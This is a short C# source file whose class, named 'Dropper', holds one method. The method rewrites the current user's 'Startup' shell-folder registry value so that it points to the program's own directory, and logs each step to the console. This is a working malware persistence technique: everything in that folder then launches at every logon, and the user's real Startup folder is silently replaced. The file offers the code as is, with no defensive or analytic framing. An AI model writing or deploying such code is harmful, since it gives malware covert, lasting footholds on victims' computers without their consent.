using Microsoft.Win32;

namespace ConsoleApp
{
    internal class Dropper
    {
        public static void ChangeStartup()
        {
            Console.WriteLine("- Changing Startup");
            string cwd = AppContext.BaseDirectory;
            string subkeyName = "Startup";
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders", true))
            {
                if (key != null)
                {
                    Console.WriteLine($"key: {key.Name}");
                    key.SetValue(subkeyName, cwd);
                    Console.WriteLine($"Registry '{key.Name}\\{subkeyName}' set to {key.GetValue(subkeyName)}");
                } else
                {
                    Console.WriteLine("Error");
                }
            }
        }
    }
}
